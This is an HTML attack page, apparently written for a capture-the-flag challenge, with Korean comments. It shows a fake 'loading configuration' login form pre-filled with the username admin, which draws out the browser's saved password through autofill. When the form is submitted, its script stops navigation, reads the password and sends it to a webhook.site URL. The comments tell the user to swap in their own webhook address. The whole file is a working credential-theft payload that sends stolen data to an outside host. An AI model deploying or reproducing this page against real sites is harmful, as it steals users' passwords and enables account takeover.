<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h1>Please wait, loading configuration...</h1>

    <form id="login-form" action="https://autofill-web.k17.kctf.cloud/login" method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" value="admin" autocomplete="username">
        <br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" autocomplete="current-password">
        <br>
        <input type="submit" value="Sign In">
    </form>

    <script>
        // (중요) 이 URL을 당신의 Webhook.site URL로 반드시 교체하세요!
        const webhookUrl = 'https://webhook.site/4cea2e4b-cd66-4c12-adf3-a0a0fc51ffe3';
        const form = document.getElementById('login-form');

        form.addEventListener('submit', (event) => {
            // 1. (핵심) 폼 제출을 막아 페이지가 절대 이동하지 않도록 합니다.
            event.preventDefault();

            const stolenPassword = document.getElementById('password').value;

            if (stolenPassword) {
                console.log("Password stolen. Sending to webhook:", stolenPassword);
                // 2. 훔친 비밀번호를 보내기만 하고, 더 이상 아무것도 하지 않습니다.
                // 이렇게 하면 fetch 요청이 취소될 걱정이 없습니다.
                fetch(`${webhookUrl}?password=${encodeURIComponent(stolenPassword)}`);
            } else {
                console.log("Submit triggered, but password field is empty.");
                fetch(`${webhookUrl}?error=autofill_failed_final`);
            }
        });
    </script>
</body>
</html>
